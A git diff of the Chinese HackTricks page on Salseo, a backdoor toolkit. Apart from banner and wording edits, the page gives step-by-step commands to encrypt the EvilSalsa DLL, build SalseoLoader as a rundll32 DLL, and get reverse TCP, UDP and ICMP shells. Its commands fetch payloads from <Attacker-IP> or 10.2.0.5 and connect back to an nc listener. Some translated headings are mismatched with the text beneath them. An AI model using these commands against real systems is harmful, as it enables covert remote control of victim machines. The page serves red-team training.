@@ -1,18 +1,19 @@
 # Salseo
 
+{% hint style="success" %}
+学习并练习AWS黑客：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习并练习GCP黑客：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
+<summary>支持HackTricks</summary>
 
-支持HackTricks的其他方式：
-
-* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
-* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享黑客技巧。**
 
 </details>
+{% endhint %}
 
 ## 编译二进制文件
 
@@ -32,7 +33,7 @@
 
 ## 准备后门
 
-首先，您需要对**EvilSalsa.dll**进行编码。您可以使用python脚本**encrypterassembly.py**或编译项目**EncrypterAssembly**：
+首先，您需要对**EvilSalsa.dll**进行编码。您可以使用python脚本**encrypterassembly.py**或者编译项目**EncrypterAssembly**：
 
 ### **Python**
 ```
@@ -41,7 +42,7 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 ### Windows
 
-Windows系统是最常见的操作系统之一，因此在渗透测试中经常会遇到。以下是一些常见的Windows后门技术：
+### Windows
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -64,9 +65,9 @@ SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Att
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **获取 ICMP 反向 shell（编码的 dll 已经在受害者内部）**
+### **获取 ICMP 反向 shell（已经在受害者内部编码的 dll）**
 
-**这次你需要在客户端上使用一个特殊工具来接收反向 shell。下载：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
+**这次您需要在客户端上使用一个特殊工具来接收反向 shell。下载：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
 #### **禁用 ICMP 回复：**
 ```
@@ -75,7 +76,7 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=1
 #You finish, you can enable it again running:
 sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
-#### 执行客户端：
+#### 执行客户端:
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
@@ -83,43 +84,43 @@ python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
-## 编译 SalseoLoader 作为导出主函数的 DLL
+## 编译SalseoLoader作为导出主函数的DLL
 
-使用 Visual Studio 打开 SalseoLoader 项目。
+使用Visual Studio打开SalseoLoader项目。
 
 ### 在主函数之前添加：\[DllExport]
 
 ![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-### 为此项目安装 DllExport
+### 为此项目安装DllExport
 
-#### **工具** --> **NuGet 包管理器** --> **管理解决方案的 NuGet 包...**
+#### **工具** --> **NuGet程序包管理器** --> **管理解决方案的NuGet程序包...**
 
 ![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **在浏览选项卡中搜索 DllExport 包，并按 Install（接受弹出窗口）**
+#### **搜索DllExport包（使用浏览选项卡），然后按安装（并接受弹出窗口）**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-在项目文件夹中会出现文件：**DllExport.bat** 和 **DllExport\_Configure.bat**
+在您的项目文件夹中会出现文件：**DllExport.bat** 和 **DllExport\_Configure.bat**
 
-### **卸载 DllExport**
+### **卸载DllExport**
 
 点击 **卸载**（是的，这很奇怪，但相信我，这是必要的）
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
-### **退出 Visual Studio 并执行 DllExport\_configure**
+### **退出Visual Studio并执行DllExport\_configure**
 
 只需 **退出** Visual Studio
 
-然后，转到您的 **SalseoLoader 文件夹** 并 **执行 DllExport\_Configure.bat**
+然后，转到您的 **SalseoLoader文件夹** 并 **执行DllExport\_Configure.bat**
 
-选择 **x64**（如果您将在 x64 系统中使用它，这是我的情况），选择 **System.Runtime.InteropServices**（在 **DllExport 的命名空间** 中）并按 **应用**
+选择 **x64**（如果您将在x64系统中使用它，这是我的情况），选择 **System.Runtime.InteropServices**（在 **DllExport的命名空间** 中）并按 **应用**
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
 
-### **再次使用 Visual Studio 打开项目**
+### **再次使用Visual Studio打开项目**
 
 **\[DllExport]** 不应再被标记为错误
 
@@ -127,19 +128,19 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 ### 构建解决方案
 
-选择 **输出类型 = 类库**（项目 --> SalseoLoader 属性 --> 应用程序 --> 输出类型 = 类库）
+选择 **输出类型 = 类库**（项目 --> SalseoLoader属性 --> 应用程序 --> 输出类型 = 类库）
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-选择 **x64 平台**（项目 --> SalseoLoader 属性 --> 构建 --> 平台目标 = x64）
+选择 **x64平台**（项目 --> SalseoLoader属性 --> 构建 --> 平台目标 = x64）
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-要 **构建** 解决方案：构建 --> 构建解决方案（在输出控制台中将显示新 DLL 的路径）
+要 **构建** 解决方案：构建 --> 构建解决方案（在输出控制台中将显示新DLL的路径）
 
-### 测试生成的 Dll
+### 测试生成的Dll
 
-将 Dll 复制粘贴到要测试的位置。
+将Dll复制粘贴到要测试的位置。
 
 执行：
 ```
@@ -149,7 +150,7 @@ rundll32.exe SalseoLoader.dll,main
 
 ## 使用DLL获取shell
 
-不要忘记使用**HTTP服务器**并设置一个**nc监听器**
+不要忘记使用**HTTP** **服务器**并设置一个**nc** **监听器**
 
 ### Powershell
 ```
@@ -162,7 +163,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-### CMD
+CMD（Command Prompt）是Windows操作系统中的命令行界面。通过CMD，用户可以直接输入命令来与操作系统进行交互，执行各种操作，包括文件管理、网络配置、系统设置等。CMD也是许多后门和恶意软件用来执行命令并控制受感染系统的常见工具之一。
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -171,16 +172,17 @@ set lport=1337
 set shell=reversetcp
 rundll32.exe SalseoLoader.dll,main
 ```
+{% hint style="success" %}
+学习并练习AWS Hacking：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习并练习GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
+<summary>支持 HackTricks</summary>
 
-其他支持HackTricks的方式：
-
-* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
-* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
+{% endhint %}
